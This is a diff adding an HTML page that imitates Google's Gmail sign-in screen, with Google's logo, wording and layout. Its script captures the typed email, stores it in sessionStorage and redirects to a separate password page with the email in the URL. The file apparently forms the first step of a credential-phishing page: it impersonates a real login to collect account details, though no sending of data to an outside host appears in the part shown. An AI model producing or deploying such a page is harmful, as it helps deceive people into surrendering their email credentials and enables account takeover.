@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail Sign In</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        /* Reset and Base Styles */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #202124; /* Main dark background */
+            color: #2c2e31; /* Primary light text color */
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+        }
+
+        body {
+          min-height: 100vh;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          background: var(--gm3-sys-color-surface-container, #27292b);
+          margin: 0;
+        }
+
+        /* Ensure the main card container matches Google Workspace login size */
+        .TcuCfd {
+          width: 480px;
+          min-height: 450px;
+          border-radius: 20px;
+          padding: 24px;
+          background: var(--gm3-sys-color-surface-container, #f0f4f9);
+          box-shadow: 0 1px 3px rgba(60,64,67,.3), 0 4px 8px rgba(60,64,67,.15);
+          display: flex;
+          flex-direction: column;
+          justify-content: center;
+          align-items: center;
+          margin: 0;
+        }
+
+        @media (max-width: 600px) {
+          .TcuCfd {
+            width: 100%;
+            min-width: 0;
+            border-radius: 0;
+            padding: 16px;
+          }
+        }
+
+        /* Main Centered Card Container */
+        .login-card {
+            background-color: #080909; /* Card background */
+            border-radius: 20px;
+            padding: 48px 40px 36px;
+            width: 1000px; /* Fixed width to match image scale */
+            height: 500px;  /* Fixed height to match image scale */
+            display: flex;
+            margin-top: 140px;
+            margin-bottom: 200px;
+        }
+
+        /* Content Layout (Left and Right Columns) */
+        .content-wrapper {
+            display: flex;
+            width: 100%;
+            height: 100%;
+        }
+
+        .left-column {
+            width: 50%;
+            padding-right: 24px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .right-column {
+            width: 50%;
+            padding-left: 24px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Typography and Elements - Left Column */
+        .google-logo {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 44px;
+            font-weight: 400;
+            line-height: 1.1667;
+            margin-bottom: 10px;
+            color: #ffffff;
+        }
+
+        .sub-heading {
+            font-size: 16px;
+            font-weight: 400;
+            line-height: 1.5;
+            color: #ffffff;
+        }
+
+        /* Form Elements - Right Column */
+        .input-container {
+            margin-top: 70px;
+            margin-bottom: 8px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 13px 15px;
+            margin: 1px; /* To offset border thickness change on focus */
+            background-color: transparent;
+            border: 1px solid #5f6368;
+            border-radius: 4px;
+            color: #e8eaed;
+            font-size: 16px;
+            font-family: 'Roboto', sans-serif;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border: 2px solid #8ab4f8;
+            margin: 0px; /* Remove margin so element doesn't jump */
+        }
+
+        .input-field::placeholder {
+            color: #9aa0a6;
+        }
+
+        /* Links and Helper Text */
+        .link-blue {
+            color: #8ab4f8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+            background: none;
+            border: none;
+            padding: 0;
+            cursor: pointer;
+            display: inline-block;
+        }
+
+        .forgot-email-container {
+            margin-bottom: 40px;
+        }
+
+        .guest-mode-text {
+            font-size: 14px;
+            color: #9aa0a6;
+            line-height: 1.4286;
+        }
+
+        /* Bottom Button Group */
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: auto; /* Pushes buttons to bottom of container */
+            padding-bottom: 10px;
+        }
+
+        .btn-next {
+            background-color: #8ab4f8;
+            color: #202124;
+            border: none;
+            border-radius: 18px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            font-family: 'Roboto', sans-serif;
+            transition: background-color 0.2s;
+        }
+
+        .btn-next:hover {
+            background-color: #a6c8ff;
+        }
+
+        /* Footer Styles */
+        .footer {
+            width: 1040px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 24px;
+            font-size: 12px;
+            color: #9aa0a6;
+            /* Ensure footer stays at bottom */
+            position: absolute;
+            bottom: 0;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+        
+        .language-selector span {
+             margin-right: 24px;
+        }
+
+        .footer-links a {
+            color: #9aa0a6;
+            text-decoration: none;
+            margin-left: 24px;
+        }
+
+        .TcuCfd form {
+          margin-top: 32px;
+        }
+        .TcuCfd form .rFrNMe, /* input wrapper */
+        .TcuCfd form .dMNVAe, /* comment/error wrapper */
+        .TcuCfd .RDsYTb { /* Not your computer? section */
+          margin-top: 24px;
+        }
+        .TcuCfd form .rFrNMe {
+          margin-top: 16px;
+        }
+        .TcuCfd form .dMNVAe {
+          margin-top: 8px;
+        }
+        .TcuCfd .RDsYTb {
+          margin-top: 32px;
+        }
+        .TcuCfd .vAV9bf { /* Sign in heading */
+          text-align: left;
+          margin-left: 0;
+        }
+        .TcuCfd form {
+          display: flex;
+          flex-direction: column;
+          align-items: flex-start;
+        }
+        .TcuCfd form .rFrNMe input {
+          text-align: left;
+        }
+        @media (max-width: 600px) {
+          .TcuCfd form {
+            margin-top: 16px;
+          }
+          .TcuCfd .RDsYTb {
+            margin-top: 16px;
+          }
+        }
+    </style>
+</head>
+<body>
+
+    <main class="login-card TcuCfd">
+        <div class="content-wrapper">
+            <div class="left-column">
+                <svg class="google-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
+                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
+                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
+                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
+                </svg>
+                <h1>Sign in</h1>
+                <p class="sub-heading">to continue to Gmail</p>
+            </div>
+
+            <div class="right-column">
+                <div class="input-container">
+                    <input type="text" id="emailInput" class="input-field" placeholder="Email or phone" autocomplete="off">
+                </div>
+                
+                <div class="forgot-email-container">
+                    <button class="link-blue">Forgot email?</button>
+                </div>
+
+                <p class="guest-mode-text">
+                    Not your computer? Use Guest mode to sign in privately. 
+                    <a href="#" class="link-blue">Learn more about using Guest mode</a>
+                </p>
+
+                <div class="button-group">
+                    <button class="link-blue">Create account</button>
+                    <button id="nextButton" class="btn-next">Next</button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="language-selector">
+            <span>English (United States)</span>
+             <svg xmlns="http://www.w3.org/2000/svg" height="18px" viewBox="0 0 24 24" width="18px" fill="#9aa0a6"><path d="M0 0h24v24H0V0z" fill="none"/><path d="M7 10l5 5 5-5H7z"/></svg>
+        </div>
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            const nextButton = document.getElementById('nextButton');
+            const emailInput = document.getElementById('emailInput');
+
+            function goToPasswordPage(emailValue) {
+                // Store email in sessionStorage for retrieval on password page
+                sessionStorage.setItem('gmail_email', emailValue);
+                // Redirect with email as URL param (encode for safety)
+                window.location.href = 'password.html?email=' + encodeURIComponent(emailValue);
+            }
+
+            nextButton.addEventListener('click', function() {
+                const emailValue = emailInput.value;
+
+                // Basic validation to ensure the field isn't empty
+                if (emailValue.trim() === "") {
+                    emailInput.style.borderColor = '#EA4335';
+                    setTimeout(() => {
+                        emailInput.style.borderColor = '#8ab4f8';
+                    }, 2000);
+                    emailInput.focus();
+                    console.log("Validation failed: Email field is empty.");
+                } else {
+                    console.log(`Performing mail login for user: ${emailValue}`);
+                    goToPasswordPage(emailValue);
+                }
+            });
+
+            emailInput.addEventListener('keypress', function (e) {
+                if (e.key === 'Enter') {
+                    nextButton.click();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
